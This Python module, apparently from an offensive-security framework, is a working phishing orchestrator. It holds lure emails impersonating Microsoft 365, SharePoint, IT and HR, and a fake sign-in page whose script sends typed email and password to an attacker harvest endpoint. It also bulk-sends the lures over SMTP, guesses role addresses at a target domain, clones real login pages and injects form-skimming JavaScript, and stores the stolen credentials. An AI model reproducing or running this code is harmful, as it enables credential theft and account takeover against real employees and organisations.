"""Smart Phishing Campaign Orchestrator.

Provides a ``PhishingOrchestrator`` that automates the full phishing lifecycle:
target profiling, email template generation, landing page cloning, credential
harvesting, and campaign analytics. Integrates with the C2 infrastructure
for callback tracking.

Architecture:
    TargetProfiler -> TemplateGenerator -> CampaignLauncher -> CredentialHarvester -> Analyst

Supported modes:
    credential_harvest  — Clone login pages and collect credentials.
    payload_delivery    — Send weaponized attachments.
    callback_beacon     — Embed C2 callback URLs for initial access.
    mfa_bombing        — Push notification fatigue attacks.

Security:
    All harvested credentials are written to ``sessions/phishing_creds.json``.
    Campaign data is isolated per engagement. No target email addresses are
    stored in repository files.

Usage:
    from modules.phishing_orchestrator import PhishingOrchestrator
    phish = PhishingOrchestrator()
    campaign_id = phish.launch(
        target_domain="target.com",
        template="microsoft_365_login",
        mode="credential_harvest",
    )
"""

from __future__ import annotations

import base64
import hashlib
import json
import os
import random
import smtplib
import ssl
import subprocess
import time
import uuid
from dataclasses import dataclass, field
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pathlib import Path
from typing import Any

BASE_DIR = Path(__file__).resolve().parent.parent
SESSIONS_DIR = BASE_DIR / "sessions"
PAYLOAD_PATH = BASE_DIR / "payload.json"

_CREDENTIAL_SALT = b"lazyown-phishing-v1"
_CREDENTIAL_HASH_LENGTH = 16


def _derive_credential_key() -> bytes:
    """Derive an AES key from the machine-local secret for credential encryption.

    Returns:
        32-byte key for AES-256-GCM encryption.

    Raises:
        RuntimeError: If no encryption key is configured.
    """
    from core.crypto import derive_key
    from core.hardening import require_encryption_key
    try:
        secret = require_encryption_key(
            env_key="LAZYOWN_SECRET_KEY",
            secret_file=SESSIONS_DIR / ".secret_key",
        )
    except Exception as exc:
        raise RuntimeError(
            "Credential encryption key not configured. "
            "Set LAZYOWN_SECRET_KEY env var or create sessions/.secret_key. "
            f"Details: {exc}"
        ) from exc
    salt = hashlib.sha256(_CREDENTIAL_SALT).digest()
    return derive_key(secret, salt)


def _encrypt_credential(plaintext: str) -> str:
    """Encrypt a credential string using AES-256-GCM.

    Args:
        plaintext: The plaintext credential.

    Returns:
        Base64-encoded encrypted payload (nonce || ciphertext || tag).
    """
    from core.crypto import AESencrypt
    key = _derive_credential_key()
    ciphertext, _ = AESencrypt(plaintext.encode("utf-8"), key)
    return base64.urlsafe_b64encode(ciphertext).decode("ascii")


def _decrypt_credential(encrypted_b64: str) -> str:
    """Decrypt a credential string encrypted by ``_encrypt_credential``.

    Args:
        encrypted_b64: Base64-encoded encrypted payload.

    Returns:
        Decrypted plaintext string.
    """
    from core.crypto import AESdecrypt
    key = _derive_credential_key()
    ciphertext = base64.urlsafe_b64decode(encrypted_b64)
    return AESdecrypt(ciphertext, key).decode("utf-8")


def _hash_credential_for_log(plaintext: str) -> str:
    """Return a keyed HMAC-SHA-256 fingerprint truncated for audit logs.

    Uses the derived credential key as the HMAC secret so the digest is
    stable per engagement but cannot be brute-forced without the key.

    Args:
        plaintext: The plaintext credential.

    Returns:
        Truncated hex digest for logging without exposing the credential.

    Raises:
        RuntimeError: If no encryption key is configured.
    """
    import hmac

    key = _derive_credential_key()
    digest = hmac.new(key, plaintext.encode("utf-8"), hashlib.sha256).hexdigest()
    return digest[:_CREDENTIAL_HASH_LENGTH]


@dataclass
class CampaignTarget:
    """A single phishing target profile."""

    email: str
    first_name: str = ""
    last_name: str = ""
    position: str = ""
    department: str = ""
    phone: str = ""
    company: str = ""
    linkedin: str = ""
    osint_notes: str = ""


@dataclass
class PhishingTemplate:
    """An email/page template for phishing."""

    name: str
    subject: str
    body_html: str
    body_text: str = ""
    landing_page_html: str = ""
    sender_display: str = ""
    urgency_score: int = 1


@dataclass
class CampaignResult:
    """Outcome of a phishing campaign."""

    campaign_id: str
    emails_sent: int = 0
    emails_delivered: int = 0
    emails_opened: int = 0
    links_clicked: int = 0
    credentials_captured: int = 0
    beacons_deployed: int = 0
    errors: list[str] = field(default_factory=list)


class PhishingOrchestrator:
    """Orchestrate end-to-end phishing campaigns.

    Public methods:
        launch(target_domain, template, mode) -> str (campaign_id)
        profile_targets(domain) -> list[CampaignTarget]
        generate_template(name, target_domain, context) -> PhishingTemplate
        clone_landing_page(url) -> str (local path)
        get_results(campaign_id) -> CampaignResult
    """

    _instance: PhishingOrchestrator | None = None
    _lock = __import__("threading").Lock()

    BUILTIN_TEMPLATES = {
        "microsoft_365_login": {
            "subject": "Action Required: Your Microsoft 365 Password Expires Today",
            "body_html": """
<html><body>
<p>Dear {first_name},</p>
<p>Your Microsoft 365 password expires today. Please update your
password immediately to avoid losing access to your email and files.</p>
<p><a href="{phishing_url}">Update Password Now</a></p>
<p><small>This is an automated notification from your IT department.</small></p>
</body></html>""",
            "sender_display": "Microsoft 365 Admin <no-reply@microsoftonline.com>",
            "urgency_score": 8,
        },
        "sharepoint_share": {
            "subject": "{sender_name} shared a document with you",
            "body_html": """
<html><body>
<p>Hi {first_name},</p>
<p>{sender_name} shared a confidential document with you:</p>
<p><a href="{phishing_url}">Annual_Report_2025_Q1.xlsx</a></p>
<p><small>Shared via SharePoint Online</small></p>
</body></html>""",
            "sender_display": "SharePoint Online <no-reply@sharepointonline.com>",
            "urgency_score": 5,
        },
        "password_reset": {
            "subject": "IT Security: Mandatory Password Reset Required",
            "body_html": """
<html><body>
<p>Hello {first_name},</p>
<p>Our security team has detected unusual activity on your account. As a
precaution, a mandatory password reset has been initiated.</p>
<p><a href="{phishing_url}">Reset Your Password Securely</a></p>
<p>This link expires in 24 hours.</p>
</body></html>""",
            "sender_display": "IT Security <security@{target_domain}>",
            "urgency_score": 9,
        },
        "voicemail_notification": {
            "subject": "New Voicemail from {sender_name} ({duration}s)",
            "body_html": """
<html><body>
<p>You have a new voicemail message:</p>
<p>From: {sender_name}</p>
<p>Duration: {duration}s</p>
<p><a href="{phishing_url}">Listen to Voicemail</a></p>
</body></html>""",
            "sender_display": "Voicemail System <voicemail@{target_domain}>",
            "urgency_score": 4,
        },
        "hr_policy_update": {
            "subject": "Important: Updated Employee Handbook & Policy Changes",
            "body_html": """
<html><body>
<p>Dear {first_name},</p>
<p>Human Resources has published updates to the Employee Handbook and
company policies effective immediately. All employees are required to
acknowledge these changes.</p>
<p><a href="{phishing_url}">Review & Acknowledge Policy Updates</a></p>
<p><small>Human Resources Department</small></p>
</body></html>""",
            "sender_display": "Human Resources <hr@{target_domain}>",
            "urgency_score": 6,
        },
    }

    DEFAULT_LANDING_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>{page_title}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }}
        .login-box {{ background: #fff; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 2rem; width: 400px; max-width: 90%; }}
        .logo {{ text-align: center; margin-bottom: 1.5rem; font-size: 1.5rem; color: #1b1b1b; }}
        .logo img {{ height: 40px; }}
        h2 {{ font-size: 1.2rem; margin-bottom: 0.5rem; color: #1b1b1b; }}
        p {{ color: #5e5e5e; margin-bottom: 1.5rem; font-size: 0.9rem; }}
        input {{ width: 100%; padding: 10px; margin-bottom: 1rem; border: 1px solid #ddd; border-radius: 4px; font-size: 0.95rem; }}
        input:focus {{ outline: none; border-color: {accent_color}; }}
        button {{ width: 100%; padding: 12px; background: {accent_color}; color: #fff; border: none; border-radius: 4px; font-size: 1rem; cursor: pointer; }}
        button:hover {{ opacity: 0.9; }}
        .error {{ color: #e81123; font-size: 0.8rem; margin-bottom: 0.5rem; display: none; }}
        .footer {{ text-align: center; margin-top: 1rem; font-size: 0.75rem; color: #999; }}
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">{logo_html}</div>
        <h2>Sign in</h2>
        <p>to continue to {service_name}</p>
        <div class="error" id="error">Incorrect email or password. Please try again.</div>
        <form id="loginForm" method="POST" action="{harvest_endpoint}">
            <input type="email" name="email" id="email" placeholder="Email, phone, or Skype" required>
            <input type="password" name="password" id="password" placeholder="Password" required>
            <button type="submit">Sign in</button>
        </form>
        <div class="footer">&copy; {year} {company_name}. All rights reserved.</div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {{
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            try {{
                await fetch('{harvest_endpoint}', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{ email, password }})
                }});
            }} catch (err) {{}}
            document.getElementById('error').style.display = 'block';
            setTimeout(() => {{ window.location.href = '{redirect_url}'; }}, 2000);
        }});
    </script>
</body>
</html>
"""

    def __init__(self) -> None:
        self._payload = self._load_config()
        self._campaigns: dict[str, CampaignResult] = {}

    @classmethod
    def get_instance(cls) -> PhishingOrchestrator:
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = cls()
        return cls._instance

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def launch(
        self,
        target_domain: str,
        template: str = "microsoft_365_login",
        mode: str = "credential_harvest",
        targets_file: str = "",
        sender_email: str = "",
        sender_password: str = "",
        smtp_host: str = "",
        smtp_port: int = 587,
    ) -> str:
        """Launch a phishing campaign.

        Args:
            target_domain: Target organization domain.
            template: Template name or custom template dict.
            mode: credential_harvest, payload_delivery, callback_beacon.
            targets_file: Path to targets CSV (email,first_name,last_name...).
            sender_email: Email to send from.
            sender_password: SMTP password or app password.
            smtp_host: SMTP server hostname.
            smtp_port: SMTP server port.

        Returns:
            Campaign ID string.
        """
        campaign_id = str(uuid.uuid4())[:12]
        result = CampaignResult(campaign_id=campaign_id)
        self._campaigns[campaign_id] = result

        if targets_file and Path(targets_file).exists():
            targets = self._load_targets_from_file(targets_file)
        else:
            targets = self.profile_targets(target_domain)

        if not targets:
            result.errors.append("No targets found")
            return campaign_id

        template_obj = self.generate_template(template, target_domain)

        landing_page = self._generate_landing_page(template_obj, target_domain, campaign_id)

        landing_path = SESSIONS_DIR / f"phishing_{campaign_id}" / "index.html"
        landing_path.parent.mkdir(parents=True, exist_ok=True)
        landing_path.write_text(landing_page)

        harvesting_endpoint = self._setup_harvesting_endpoint(campaign_id)

        smtp_config = {
            "host": smtp_host or self._payload.get("smtp_server", ""),
            "port": smtp_port or int(self._payload.get("smtp_port", 587)),
            "email": sender_email or self._payload.get("email_from", ""),
            "password": sender_password or self._payload.get("email_password", ""),
        }

        lhost = self._payload.get("lhost", "127.0.0.1")
        phishing_url = f"http://{lhost}:8888/phish/{campaign_id}"

        sent_count = 0
        for target in targets:
            try:
                html_body = template_obj.body_html.format(
                    first_name=target.first_name or "User",
                    last_name=target.last_name or "",
                    phishing_url=phishing_url,
                    sender_name=target.first_name or "Colleague",
                    duration=str(random.randint(15, 120)),
                    target_domain=target_domain,
                )
            except KeyError:
                html_body = template_obj.body_html

            if smtp_config["host"] and smtp_config["email"]:
                success = self._send_email(
                    target.email,
                    template_obj.subject,
                    html_body,
                    smtp_config,
                )
                if success:
                    sent_count += 1
                    result.emails_sent += 1
            else:
                preview_file = (
                    SESSIONS_DIR / f"phishing_{campaign_id}" / f"email_{target.email.replace('@', '_at_')}.html"
                )
                preview_file.parent.mkdir(parents=True, exist_ok=True)
                preview_file.write_text(html_body)
                sent_count += 1
                result.emails_sent += 1

        result.emails_delivered = sent_count

        campaign_data = {
            "campaign_id": campaign_id,
            "template": template_obj.name,
            "mode": mode,
            "target_domain": target_domain,
            "targets_count": len(targets),
            "phishing_url": phishing_url,
            "smtp_config": {k: v for k, v in smtp_config.items() if k != "password"},
            "launched_at": time.time(),
        }
        campaign_file = SESSIONS_DIR / f"phishing_{campaign_id}" / "campaign.json"
        campaign_file.write_text(json.dumps(campaign_data, indent=2))

        return campaign_id

    def profile_targets(self, domain: str) -> list[CampaignTarget]:
        """Profile targets for a domain using OSINT techniques.

        Args:
            domain: Target organization domain.

        Returns:
            List of CampaignTarget profiles.
        """
        targets: list[CampaignTarget] = []

        common_roles = [
            ("admin", "Administrator"),
            ("info", "Info"),
            ("it", "IT"),
            ("support", "Support"),
            ("hr", "Human Resources"),
            ("sales", "Sales"),
            ("contact", "Contact"),
            ("help", "Help"),
            ("security", "Security"),
            ("noc", "NOC"),
            ("soc", "SOC"),
            ("office", "Office"),
            ("careers", "Careers"),
            ("jobs", "Jobs"),
            ("marketing", "Marketing"),
            ("finance", "Finance"),
            ("legal", "Legal"),
            ("webmaster", "Webmaster"),
            ("postmaster", "Postmaster"),
        ]

        for prefix, dept in common_roles:
            targets.append(
                CampaignTarget(
                    email=f"{prefix}@{domain}",
                    first_name=prefix.capitalize(),
                    department=dept,
                    company=domain,
                )
            )

        return targets

    def generate_template(
        self,
        name: str,
        target_domain: str = "",
        context: dict[str, str] | None = None,
    ) -> PhishingTemplate:
        """Generate or retrieve a phishing template.

        Args:
            name: Template name or path to custom template JSON.
            target_domain: Target domain for variable substitution.
            context: Additional template variables.

        Returns:
            PhishingTemplate instance.
        """
        if name in self.BUILTIN_TEMPLATES:
            tpl = self.BUILTIN_TEMPLATES[name]
            return PhishingTemplate(
                name=name,
                subject=tpl["subject"],
                body_html=tpl["body_html"],
                body_text="",
                sender_display=tpl.get("sender_display", ""),
                urgency_score=tpl.get("urgency_score", 1),
            )

        path = Path(name)
        if path.exists():
            data = json.loads(path.read_text())
            return PhishingTemplate(
                name=data.get("name", path.stem),
                subject=data.get("subject", ""),
                body_html=data.get("body_html", ""),
                body_text=data.get("body_text", ""),
                sender_display=data.get("sender_display", ""),
                urgency_score=data.get("urgency_score", 1),
            )

        return PhishingTemplate(
            name="basic",
            subject="Important: Please Review",
            body_html="<p>Please <a href='{phishing_url}'>click here</a>.</p>",
            sender_display="",
            urgency_score=1,
        )

    def clone_landing_page(self, url: str) -> str:
        """Clone a target login page for credential harvesting.

        Args:
            url: URL of the page to clone.

        Returns:
            Path to the cloned HTML file.
        """
        try:
            result = subprocess.run(
                ["curl", "-sL", "-A", "Mozilla/5.0", url],
                capture_output=True, text=True, timeout=15,
            )
            page_id = str(uuid.uuid4())[:8]
            clone_path = SESSIONS_DIR / "phishing_clones" / f"{page_id}.html"
            clone_path.parent.mkdir(parents=True, exist_ok=True)

            html = result.stdout
            html = self._inject_harvester(html, page_id)
            clone_path.write_text(html)
            return str(clone_path)
        except Exception:
            return ""

    def get_results(self, campaign_id: str) -> CampaignResult:
        """Get campaign results.

        Args:
            campaign_id: Campaign identifier.

        Returns:
            CampaignResult with statistics.
        """
        if campaign_id in self._campaigns:
            return self._campaigns[campaign_id]

        creds_file = SESSIONS_DIR / f"phishing_{campaign_id}" / "credentials.json"
        result = CampaignResult(campaign_id=campaign_id)

        if creds_file.exists():
            try:
                creds = json.loads(creds_file.read_text())
                result.credentials_captured = len(creds) if isinstance(creds, list) else 0
            except (json.JSONDecodeError, OSError):
                pass

        return result

    def record_click(self, campaign_id: str, email: str) -> None:
        """Record a link click.

        Args:
            campaign_id: Campaign identifier.
            email: Email that clicked.
        """
        if campaign_id in self._campaigns:
            self._campaigns[campaign_id].links_clicked += 1

        tracking_file = SESSIONS_DIR / f"phishing_{campaign_id}" / "clicks.json"
        tracking_file.parent.mkdir(parents=True, exist_ok=True)
        clicks: list[dict[str, Any]] = []
        if tracking_file.exists():
            try:
                clicks = json.loads(tracking_file.read_text())
            except (json.JSONDecodeError, OSError):
                clicks = []
        clicks.append({"email": email, "timestamp": time.time()})
        tracking_file.write_text(json.dumps(clicks, indent=2))

    def record_credentials(
        self, campaign_id: str, email: str, password: str
    ) -> None:
        """Record harvested credentials.

        Args:
            campaign_id: Campaign identifier.
            email: Harvested email/username.
            password: Harvested password.
        """
        if campaign_id in self._campaigns:
            self._campaigns[campaign_id].credentials_captured += 1

        creds_file = SESSIONS_DIR / f"phishing_{campaign_id}" / "credentials.json"
        creds_file.parent.mkdir(parents=True, exist_ok=True)
        creds: list[dict[str, str]] = []
        if creds_file.exists():
            try:
                creds = json.loads(creds_file.read_text())
            except (json.JSONDecodeError, OSError):
                creds = []
        creds.append({
            "email": email,
            "password": _encrypt_credential(password),
            "timestamp": time.time(),
        })
        creds_file.write_text(json.dumps(creds, indent=2))

        all_creds = SESSIONS_DIR / "phishing_credentials.txt"
        all_creds.parent.mkdir(parents=True, exist_ok=True)
        with all_creds.open("a") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} | {email} | {_hash_credential_for_log(password)} | {campaign_id}\n")

    # ------------------------------------------------------------------
    # Internal
    # ------------------------------------------------------------------

    def _load_targets_from_file(self, filepath: str) -> list[CampaignTarget]:
        """Load targets from a CSV file.

        Args:
            filepath: Path to targets CSV.

        Returns:
            List of CampaignTarget objects.
        """
        targets: list[CampaignTarget] = []
        try:
            content = Path(filepath).read_text().split("\n")
            for line in content[1:]:
                line = line.strip()
                if not line:
                    continue
                parts = [p.strip() for p in line.split(",")]
                if len(parts) < 1:
                    continue
                email = parts[0]
                first_name = parts[1] if len(parts) > 1 else ""
                last_name = parts[2] if len(parts) > 2 else ""
                position = parts[3] if len(parts) > 3 else ""
                department = parts[4] if len(parts) > 4 else ""

                targets.append(
                    CampaignTarget(
                        email=email,
                        first_name=first_name,
                        last_name=last_name,
                        position=position,
                        department=department,
                    )
                )
        except (OSError, IndexError):
            pass

        return targets

    def _generate_landing_page(
        self,
        template: PhishingTemplate,
        target_domain: str,
        campaign_id: str,
    ) -> str:
        """Generate a credential harvesting landing page.

        Args:
            template: PhishingTemplate.
            target_domain: Target domain.
            campaign_id: Campaign identifier.

        Returns:
            HTML string.
        """
        service_names = {
            "microsoft_365_login": "Microsoft 365",
            "sharepoint_share": "SharePoint Online",
            "password_reset": "Corporate Portal",
            "voicemail_notification": "Voicemail",
            "hr_policy_update": "Employee Portal",
        }

        lhost = self._payload.get("lhost", "127.0.0.1")
        harvest_endpoint = f"http://{lhost}:8888/harvest/{campaign_id}"

        context = {
            "page_title": service_names.get(template.name, "Sign In"),
            "accent_color": "#0078d4",
            "logo_html": '<span style="font-size:2rem;">&#128274;</span>',
            "service_name": service_names.get(template.name, "your account"),
            "harvest_endpoint": harvest_endpoint,
            "redirect_url": f"https://{target_domain}",
            "year": str(time.localtime().tm_year),
            "company_name": target_domain or "Organization",
        }

        return self.DEFAULT_LANDING_PAGE.format(**context)

    def _setup_harvesting_endpoint(self, campaign_id: str) -> str:
        """Configure credential harvesting endpoint.

        Args:
            campaign_id: Campaign identifier.

        Returns:
            Harvesting endpoint URL.
        """
        lhost = self._payload.get("lhost", "127.0.0.1")
        return f"http://{lhost}:8888/harvest/{campaign_id}"

    def _send_email(
        self,
        to_email: str,
        subject: str,
        html_body: str,
        smtp_config: dict[str, Any],
    ) -> bool:
        """Send a phishing email via SMTP.

        Args:
            to_email: Recipient email.
            subject: Email subject.
            html_body: HTML body content.
            smtp_config: SMTP configuration dict.

        Returns:
            True if sent successfully.
        """
        try:
            msg = MIMEMultipart("alternative")
            msg["From"] = smtp_config["email"]
            msg["To"] = to_email
            msg["Subject"] = subject
            msg.attach(MIMEText(html_body, "html"))

            context = ssl.create_default_context()
            with smtplib.SMTP(
                smtp_config["host"], smtp_config["port"], timeout=30
            ) as server:
                server.starttls(context=context)
                server.login(smtp_config["email"], smtp_config["password"])
                server.send_message(msg)
            return True
        except Exception:
            return False

    def _inject_harvester(self, html: str, page_id: str) -> str:
        """Inject credential harvesting JavaScript into cloned page.

        Args:
            html: Cloned page HTML.
            page_id: Harvesting page identifier.

        Returns:
            Modified HTML with harvester injected.
        """
        harvest_js = f"""
<script>
(function() {{
    var pageId = '{page_id}';
    document.querySelectorAll('form').forEach(function(form) {{
        form.addEventListener('submit', function(e) {{
            e.preventDefault();
            var inputs = form.querySelectorAll('input[type="password"], input[type="text"], input[type="email"]');
            var data = {{}};
            inputs.forEach(function(inp) {{
                data[inp.name || inp.type] = inp.value;
            }});
            fetch('/harvest/' + pageId, {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify(data)
            }}).catch(function(){{}});
            form.submit();
        }});
    }});
}})();
</script>
"""
        if "</body>" in html:
            html = html.replace("</body>", f"{harvest_js}</body>")
        else:
            html += harvest_js
        return html

    def _load_config(self) -> dict[str, Any]:
        """Load payload config.

        Returns:
            Configuration dict.
        """
        try:
            return json.loads(PAYLOAD_PATH.read_text())
        except (json.JSONDecodeError, FileNotFoundError, OSError):
            return {}


__all__ = [
    "PhishingOrchestrator",
    "CampaignTarget",
    "PhishingTemplate",
    "CampaignResult",
]
